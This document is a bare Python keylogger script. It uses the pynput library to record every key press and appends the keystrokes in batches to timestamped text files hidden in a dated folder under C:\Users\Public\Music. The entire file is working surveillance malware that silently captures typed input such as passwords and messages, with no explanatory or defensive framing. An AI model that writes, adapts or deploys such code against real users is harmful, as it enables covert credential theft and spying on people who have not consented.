from pynput.keyboard import Listener
from datetime import date
from time import time
from os import mkdir , path

charList = []
key_count = 0

def save_file(liste):
	with open(filepath+r"\\"+filename , "a" , encoding="utf8") as file:
		for i in liste:
			x = str(i).replace("'" , "")
			if(x.find("space") > 0 or x.find("enter") > 0):
				file.write("\n")
			elif(x.find("key") == -1):
				file.write("\n")
				file.write(x)
def click_key(k1):
	global key_count
	key_count += 1
	charList.append(k1)
	if(key_count > 20):
		key_count = 0
		save_file(charList)
		charList.clear()


filepath = r"C:\Users\Public\Music\\"

today = date.today()
filepath = filepath+str(today)
if(path.isdir(filepath)):
	pass
else:
	mkdir(filepath)

filename = str(time()) + ".txt"


with Listener(on_press= click_key) as listener:
	listener.join()
